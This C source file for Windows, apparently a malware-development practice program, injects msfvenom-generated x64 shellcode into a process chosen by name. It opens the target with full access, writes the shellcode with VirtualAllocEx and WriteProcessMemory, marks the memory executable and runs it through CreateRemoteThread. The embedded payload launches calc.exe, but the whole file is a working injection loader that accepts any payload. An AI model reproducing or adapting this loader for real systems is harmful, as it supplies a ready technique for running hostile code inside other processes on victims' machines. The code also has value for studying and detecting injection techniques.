#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

// msfvenom -a x64 --platform windows -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
// .data saved payload
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	HANDLE hSnapShot = NULL;

	// Create a snapshot of all processes in the system
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	PROCESSENTRY32	Proc = {
	.dwSize = sizeof(PROCESSENTRY32)
	};

	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("created a snapshot using CreateToolhelp32Snapshot\n");

	// Iterate through the snapshot to find the process with the specified name
	while (Process32Next(hSnapShot, &Proc)) {
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {

			printf("Process \"%ls\" found with PID: %d \n", szProcessName, Proc.th32ProcessID);

			*dwProcessId = Proc.th32ProcessID;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);

			if (*hProcess == NULL) {
				printf("OpenProcess Failed With Error : %d \n", GetLastError());
				CloseHandle(hSnapShot);
				return FALSE;
			}
			CloseHandle(hSnapShot);
			return TRUE; // Process found and handle obtained
		}
	}
	CloseHandle(hSnapShot); // Clean up the snapshot handle
	printf("Process \"%ls\" not found.\n", szProcessName);
	return FALSE; // Process not found
}


BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeofShellcode) {

	DWORD	dwOldProtection = NULL;	
	PVOID	pShellcodeAddress = NULL;
	SIZE_T	sNumberOfBytesWritten = NULL;

	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeofShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("VirtualAllocEx Failed With Error : %d \n", GetLastError());
	}



	printf("pAddress Allocated At : 0x%p using VirtualAllocEx Of Size : %d with RW permissions\n", pShellcodeAddress, sSizeofShellcode);
	printf("Press <Enter> To Write ... ");
	getchar();





	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeofShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeofShellcode) {
		printf("WriteProcessMemory Failed With Error : %d \n", GetLastError());
	}
	

	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeofShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("Successfully written %d bytes, Press <Enter>\n", sNumberOfBytesWritten);
	getchar();



	printf("Executing the shellcode in the remote process using CreateRemoteThread");
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL);	if (hThread == NULL) {
		printf("CreateRemoteThread Failed With Error : %d \n", GetLastError());
	}
	printf("Thread ID: %lu", GetThreadId(hThread));
	printf("DONE !\n");
	if (hThread) {
		CloseHandle(hThread);
	}

}


int wmain(int argc, wchar_t* argv[]) { // Utilisation de wchar_t 
	if (argc < 2) {
		printf("Usage: maldev.exe <TargetProcessName>\n");
		return -1;
	}
	printf("Injecting the shellcode to the remote process \"%ls\"\n", argv[1]);

	HANDLE hProcess = NULL;
	DWORD dwProcessId = 0;

	// get the remote handle of the target process
	if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
		printf("Failed to get remote process handle.\n");
		return -1;
	}


	// inject the dll to the remote process using CreateRemoteThread
	if (!InjectShellcodeToRemoteProcess(hProcess, shellcode ,sizeof(shellcode))) {
		printf("DLL Injection failed.\n");
		CloseHandle(hProcess);
		return -1;
	}

	printf("Done! Press <Enter> to quit");
	getchar();

	CloseHandle(hProcess);
	return 0;
}

